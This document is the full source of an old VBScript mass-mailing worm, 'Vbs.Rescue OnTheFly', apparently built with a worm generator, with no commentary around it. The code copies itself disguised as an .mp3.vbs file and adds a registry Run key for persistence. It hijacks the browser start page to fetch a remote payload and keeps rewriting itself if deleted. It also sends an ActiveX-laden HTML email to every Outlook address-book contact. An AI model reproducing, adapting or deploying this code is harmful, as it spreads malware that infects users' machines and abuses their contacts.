'Vbs.Rescue OnTheFly Created By Twinsen
On Error Resume Next
Set ow66B28gPn3 = CreateObject("WScript.Shell")
ow66B28gPn3.regwrite "HKCU\software\Rescue OnTheFly\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set Cg0490GNV9S= Createobject("scripting.filesystemobject")
Cg0490GNV9S.copyfile wscript.scriptfullname,Cg0490GNV9S.GetSpecialFolder(0)& "\Intervieuw with OnTheFly.mp3.vbs"
ow66B28gPn3.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Rescue OnTheFly","wscript.exe "&Cg0490GNV9S.GetSpecialFolder(0)& "\Intervieuw with OnTheFly.mp3.vbs %"
if ow66B28gPn3.regread ("HKCU\software\Rescue OnTheFly\mailed") <> "1" then
wM3KuIj67cV()
end if
ow66B28gPn3.run "http://members.tripodnet.nl/on_the_fly/index.html",3,false
aa7g6ml4ID3= ""
aa7g6ml4ID3= ow66B28gPn3.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (aa7g6ml4ID3= "") Then
aa7g6ml4ID3 = "c:"
End If
If Right(aa7g6ml4ID3, 1) = " \ " Then aa7g6ml4ID3 = Mid(aa7g6ml4ID3, 1, Len(aa7g6ml4ID3) - 1)
If Not (Cg0490GNV9S.fileexists(Cg0490GNV9S.getspecialfolder(0) & "\twinsen.vsb")) Then
If Not (Cg0490GNV9S.fileexists(aa7g6ml4ID3 & "\twinsen.vsb")) Then
ow66B28gPn3.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http:\\members.tripodnet.nl\twinsen_lba\twinsen.vsb"
Else
ow66B28gPn3.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
Cg0490GNV9S.copyfile aa7g6ml4ID3 & "\twinsen.vsb", Cg0490GNV9S.getspecialfolder(0) & "\twinsen.vsb"
ow66B28gPn3.run Cg0490GNV9S.getspecialfolder(0) & "\twinsen.vsb", 1, False
end if
Set xfDcgsIp74h= Cg0490GNV9S.opentextfile(wscript.scriptfullname, 1)
d7AUQrNpK4B= xfDcgsIp74h.readall
xfDcgsIp74h.Close
Do
If Not (Cg0490GNV9S.fileexists(wscript.scriptfullname)) Then
Set VTJa34tClgj= Cg0490GNV9S.createtextfile(wscript.scriptfullname, True)
VTJa34tClgj.writed7AUQrNpK4B
VTJa34tClgj.Close
End If
Loop
Function wM3KuIj67cV()
On Error Resume Next
Set KOgNm47kCPK= CreateObject("Outlook.Application")
If KOgNm47kCPK = "Outlook" Then
Set w9dCa18l8U7= Cg0490GNV9S.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While w9dCa18l8U7.atendofstream = False
T7l321hf43M= w9dCa18l8U7.readline
Y780WcxaSfb= Y780WcxaSfb& Chr(34) & " & vbcrlf & " & Chr(34) & replace(T7l321hf43M, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
w9dCa18l8U7.close
krvhc494w3A = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
krvhc494w3A = krvhc494w3A& vbCrLf & "On Error Resume Next"
krvhc494w3A = krvhc494w3A & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
krvhc494w3A = krvhc494w3A & vbCrLf & "If Err.Number <> 0 Then"
krvhc494w3A = krvhc494w3A & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
krvhc494w3A = krvhc494w3A & vbCrLf & "Else"
krvhc494w3A = krvhc494w3A & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\Intervieuw with OnTheFly.mp3.vbs" & Chr(34) & ", True)"
krvhc494w3A = krvhc494w3A & vbCrLf & "vbs.write  " & Chr(34) & Y780WcxaSfb& Chr(34)
krvhc494w3A = krvhc494w3A & vbCrLf & "vbs.Close"
krvhc494w3A = krvhc494w3A & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
krvhc494w3A = krvhc494w3A & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\Intervieuw with OnTheFly.mp3.vbs %" & Chr(34) & ""
PJF4CXZkQK8 = PJF4CXZkQK8& vbCrLf & "document.write " & Chr(34) & "POLICE SUCKS!<br><br>Greetzzz to OnTheFly." & Chr(34) & ""
PJF4CXZkQK8 = PJF4CXZkQK8& vbCrLf & "End If"
PJF4CXZkQK8 = PJF4CXZkQK8 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
Mu78m7UnS2Q=krvhc494w3A & PJF4CXZkQK8
Set Yn2SN1zpfe8 = KOgNm47kCPK.GetNameSpace("MAPI")
set c95qQe7lDaz=Yn2SN1zpfe8.AddressLists
For Each To9187VDL8A In c95qQe7lDaz
If To9187VDL8A.AddressEntries.Count <> 0 Then
hd1VDT8659F= To9187VDL8A.AddressEntries.Count
Set jbI0362XbsP= KOgNm47kCPK.CreateItem(0)
jbI0362XbsP.Subject = "Fw: Police Sucks!"
jbI0362XbsP.HTMLBody = Mu78m7UnS2Q
jbI0362XbsP.DeleteAfterSubmit = True
For U5s4D6g6PY6 = 1 To hd1VDT8659F
Set N71NQc521y7= To9187VDL8A.AddressEntries(U5s4D6g6PY6)
If hd1VDT8659F= 1 Then
jbI0362XbsP.BCC = N71NQc521y7.Address
Else
jbI0362XbsP.BCC = jbI0362XbsP.BCC & "; " & N71NQc521y7.Address
End If
Next
jbI0362XbsP.send
End If
Next
ow66B28gPn3.regwrite "HKCU\software\Rescue OnTheFly\mailed", "1"
KOgNm47kCPK.Quit
end if
End Function
'Vbswg 1.50b
